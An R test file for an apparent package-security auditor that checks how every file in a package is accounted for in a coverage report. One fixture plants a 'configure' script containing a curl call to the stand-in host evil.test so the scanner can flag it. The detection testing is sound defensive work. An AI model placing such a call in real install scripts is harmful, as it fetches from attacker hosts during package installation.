# The coverage frame accounts for every file in the package, so that a clean
# scan can be checked instead of trusted. These tests are mostly about what it
# refuses to leave out.

rules <- load_rules()

cov_of <- function(pkg) audit_package(pkg, rules)$coverage

test_that("a file is accounted for by its kind, wherever it sits", {
  pkg <- make_pkg(files = list(
    "R/f.R"               = "f <- function() 1",
    "misc/helper.R"       = "g <- function() 2",
    "inst/extdata/m.rds"  = "not really an rds",
    "README.md"           = "# demo",
    "man/figures/x.svg"   = "<svg/>",
    "misc/notes.txt"      = "nothing"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  cv <- cov_of(pkg)
  # An .R and an .rds are code and executable data wherever they are, so both
  # are accounted for even where no rule reads them. A name that says nothing
  # about what the file is stays out, which is what keeps the frame legible.
  expect_setequal(cv$file_context,
                  c("DESCRIPTION", "R/f.R", "misc/helper.R",
                    "inst/extdata/m.rds"))

  stray <- cv[cv$file_context == "misc/helper.R", ]
  expect_equal(stray$status, "unexamined")
  expect_equal(stray$reason, "no_rule")
  expect_equal(stray$language, "R")

  expect_equal(cv$reason[cv$file_context == "inst/extdata/m.rds"], "serialized")
})

test_that("a scanned file takes its language from the rule, not the extension", {
  pkg <- make_pkg(files = list("R/f.R"     = "f <- function() 1",
                               "configure" = "curl http://evil.test"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  cv <- cov_of(pkg)
  # configure has no extension at all, and is read as shell.
  expect_equal(cv$status[cv$file_context == "configure"], "matched")
  expect_equal(cv$language[cv$file_context == "configure"], "shell")
  expect_equal(cv$status[cv$file_context == "R/f.R"], "parsed")
  expect_equal(cv$language[cv$file_context == "R/f.R"], "R")
})

test_that("compiled sources are exportable and carry the phases of src/", {
  pkg <- make_pkg(files = list("src/hi.c"          = "void hi(void) { }",
                               "src/vendor/odd.zz" = "who knows"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  cv <- cov_of(pkg)
  c_row <- cv[cv$file_context == "src/hi.c", ]
  expect_equal(c_row$status, "exportable")
  expect_equal(c_row$language, "c")
  expect_true(c_row$at_install_src && c_row$at_load)

  # An extension nothing knows still gets src/'s phases: they come from where a
  # file sits, not from what it is named.
  odd <- cv[cv$file_context == "src/vendor/odd.zz", ]
  expect_equal(odd$status, "unexamined")
  expect_true(is.na(odd$language))
  expect_true(odd$at_install_src && odd$at_load)
})

test_that("compiled source is accounted for wherever a package ships it", {
  # Rcpp ships a C++ header library under inst/include/ for other packages to
  # compile against. No rule reads it and no rule claims it, but it is still
  # code, and export_unscanned() can hand it to a tool that reads C++.
  pkg <- make_pkg(files = list("inst/include/demo/Vector.h" = "struct V { };"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  row <- cov_of(pkg)
  row <- row[row$file_context == "inst/include/demo/Vector.h", ]
  expect_equal(row$status, "exportable")
  expect_equal(row$language, "c")
  # Nothing compiles it during this package's own lifecycle.
  expect_false(any(unlist(row[, .phase_columns])))
})

test_that("an unrecognised extension under src/ is still accounted for", {
  pkg <- make_pkg(files = list("src/vendor/odd.zz" = "who knows",
                               "src/hi.c" = "void hi(void) { }"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  cv  <- cov_of(pkg)
  odd <- cv[cv$file_context == "src/vendor/odd.zz", ]
  expect_equal(nrow(odd), 1L)
  # Everything in src/ is handed to the compiler, so the catch-all keeps it,
  # and it carries the phases of where it sits.
  expect_true(odd$at_install_src && odd$at_load)
})

test_that("serialized objects are executable surface, not inert data", {
  pkg <- make_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  dir.create(file.path(pkg, "data"))
  dir.create(file.path(pkg, "R"), showWarnings = FALSE)
  saveRDS(1:3, file.path(pkg, "data", "x.rds"))
  save(list = character(0), file = file.path(pkg, "R", "sysdata.rda"))

  cv <- cov_of(pkg)
  for (f in c("data/x.rds", "R/sysdata.rda")) {
    row <- cv[cv$file_context == f, ]
    expect_equal(row$reason, "serialized", info = f)
    expect_true(row$at_load, info = f)
  }
})

test_that("DESCRIPTION is accounted for, and claims no lifecycle phase", {
  # Authors@R is R code, but build, check and INSTALL all refuse to evaluate
  # anything outside person/as.person/c/list/paste/paste0 -- measured, not
  # assumed. What does evaluate it unguarded is developer tooling reading a
  # source tree, which is no phase of the lifecycle. The row still says the
  # file can execute and was not examined.
  pkg <- make_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  d <- cov_of(pkg)
  d <- d[d$file_context == "DESCRIPTION", ]
  expect_equal(d$status, "unexamined")
  expect_false(any(unlist(d[, .phase_columns])))
})

test_that("a file a rule claimed but nothing reads is not blamed on the rules", {
  pkg <- make_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  row <- cov_of(pkg)
  row <- row[row$file_context == "DESCRIPTION", ]
  expect_equal(row$status, "unexamined")
  expect_equal(row$reason, "no_extractor")
  expect_false(is.na(row$rule))
})

test_that("a file where no rule reaches is reported with no phases", {
  pkg <- make_pkg(files = list("odd/thing.R" = "x <- 1"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  row <- cov_of(pkg)
  row <- row[row$file_context == "odd/thing.R", ]
  expect_equal(row$reason, "no_rule")
  expect_false(any(unlist(row[, .phase_columns])))
})

test_that("version-control and IDE state is outside the package", {
  pkg <- make_pkg(files = list("R/f.R" = "f <- function() 1"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  dir.create(file.path(pkg, ".git", "objects"), recursive = TRUE)
  writeLines("x", file.path(pkg, ".git", "objects", "deadbeef"))
  dir.create(file.path(pkg, ".Rproj.user"))
  writeLines("x", file.path(pkg, ".Rproj.user", "state"))

  expect_false(any(grepl("^\\.git/|^\\.Rproj\\.user/", cov_of(pkg)$file_context)))
})

test_that("a symlink is recorded and never read", {
  skip_on_os("windows")
  pkg <- make_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  outside <- tempfile("outside"); writeLines("secret", outside)
  dir.create(file.path(pkg, "src"))
  file.symlink(outside, file.path(pkg, "src", "sneak.c"))

  row <- cov_of(pkg)
  row <- row[row$file_context == "src/sneak.c", ]
  expect_equal(row$reason, "symlink")
  expect_true(is.na(row$lines))
})

test_that("a help file that will not parse is a failure, not a clean read", {
  pkg <- make_pkg(files = list("man/f.Rd" = c(
    "\\name{f}", "\\title{f}", "\\examples{", "if (", "}"
  )))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  row <- cov_of(pkg)
  row <- row[row$file_context == "man/f.Rd", ]
  expect_equal(row$status, "error")
  expect_equal(row$reason, "unparseable")
})

test_that("a chunk no analyser reads becomes a span inside its file", {
  pkg <- make_pkg(files = list("vignettes/intro.Rmd" = c(
    "---", "title: x", "---", "", "```{r}", "y <- 1", "```", "",
    "```{python}", "import os", "```"
  )))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  cv  <- cov_of(pkg)
  rows <- cv[cv$file_context == "vignettes/intro.Rmd", ]
  expect_equal(nrow(rows), 2L)

  py <- rows[rows$language == "python", ]
  expect_equal(py$status, "exportable")
  expect_equal(c(py$first_line, py$last_line), c(10L, 10L))
  # The span takes the phases of the file it sits in: a Python chunk runs when
  # the vignette is built, whatever it is written in.
  expect_true(py$at_build)
})

test_that("summary() tallies coverage by status, location and kind", {
  pkg <- make_pkg(files = list("R/f.R"     = "f <- function() 1",
                               "src/hi.c"  = "void hi(void) { }",
                               "README.md" = "# demo"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  s <- summary(audit_package(pkg, rules))
  expect_named(s$coverage, c("status", "top_level", "type", "files", "lines"))
  expect_true(all(c("parsed", "exportable", "unexamined") %in% s$coverage$status))

  # The tally answers "what are all those files?", not only how many.
  c_row <- s$coverage[s$coverage$top_level == "src/", ]
  expect_equal(c_row$type, "c")
  expect_equal(c_row$files, 1L)

  # Sorted by status, then location, then kind, so following a directory down
  # the table shows all of it together.
  by_status <- match(s$coverage$status, .coverage_statuses)
  expect_false(is.unsorted(by_status))
  for (st in unique(s$coverage$status)) {
    rows <- s$coverage[s$coverage$status == st, ]
    expect_false(is.unsorted(order(rows$top_level, rows$type,
                                   method = "radix")), info = st)
  }
})

test_that("the report stays inside its width on a package of many files", {
  pkg <- make_pkg(files = stats::setNames(
    as.list(rep("void f(void) { }", 30)),
    sprintf("src/deeply/nested/dir/file_with_a_long_name_%02d.c", 1:30)
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  # path = FALSE because the width guarantee is about the tables pkgaudit lays
  # out, not about a filesystem path the caller supplied -- and a path in a
  # security report is not something to shorten.
  lines <- capture.output(print(summary(audit_package(pkg, rules)),
                                path = FALSE))
  expect_true(all(nchar(lines) <= 77L))
})

test_that("a binary file is accounted for as unexamined, not read", {
  pkg <- make_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  dir.create(file.path(pkg, "src"))
  writeBin(as.raw(c(0L, 1L, 2L, 3L)), file.path(pkg, "src", "hi.so"))

  cov <- audit_package(pkg, rules)$coverage
  so  <- cov[cov$file_context == "src/hi.so", ]
  expect_equal(so$status, "unexamined")
  expect_equal(so$reason, "binary")
  expect_true(is.na(so$lines))
})

test_that("a directory with nothing in scope yields an empty coverage frame", {
  empty <- tempfile("empty"); dir.create(empty)
  on.exit(unlink(empty, recursive = TRUE), add = TRUE)

  bare <- .empty_file_contexts(with_phases = FALSE)
  expect_equal(build_coverage(empty, bare[0, ], rules$file_contexts),
               .empty_coverage(with_phases = FALSE))

  # A directory holding only files no rule names is in scope for nothing.
  writeLines("hello", file.path(empty, "NOTES"))
  expect_equal(nrow(build_coverage(empty, bare[0, ], rules$file_contexts)), 0L)
})

test_that(".claiming_rule() claims nothing when nothing was found", {
  files <- c("R/f.R", "src/hi.c")
  expect_equal(.claiming_rule(files, NULL, rules$file_contexts),
               rep(NA_character_, 2L))
  expect_equal(.claiming_rule(files, .empty_file_contexts()[0, ],
                              rules$file_contexts),
               rep(NA_character_, 2L))
})

test_that(".error_reason() takes the first reading failure per file and ignores the rest", {
  errors <- .empty_errors()
  errors[1L, ] <- list("read_code",     "R/f.R", NA_character_, "cannot open")
  errors[2L, ] <- list("parse_code",    "R/f.R", NA_character_, "unexpected")
  # A rule that failed on a file says nothing about the file itself.
  errors[3L, ] <- list("find_patterns", "R/g.R", "system",      "bad xpath")

  reason <- .error_reason(c("R/f.R", "R/g.R"), errors)
  expect_equal(reason, c("unreadable", NA_character_))
  expect_equal(.error_reason("R/f.R", .empty_errors()), NA_character_)
})
